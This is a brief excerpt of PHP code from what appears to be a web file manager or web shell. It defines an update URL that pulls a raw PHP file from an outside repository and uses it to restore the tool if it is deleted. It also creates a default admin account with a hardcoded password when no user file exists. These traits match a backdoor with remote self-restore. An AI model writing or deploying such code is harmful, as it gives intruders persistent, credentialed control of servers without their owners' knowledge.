...
if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/HexaVoid77/WhenYah/refs/heads/main/marshall.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
...
function fm_load_users($f){
    if(!file_exists($f)){$s=[['user'=>'admin','hash'=>password_hash('hexa77',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true]];@file_put_contents($f,json_encode($s,JSON_PRETTY_PRINT));return $s;}
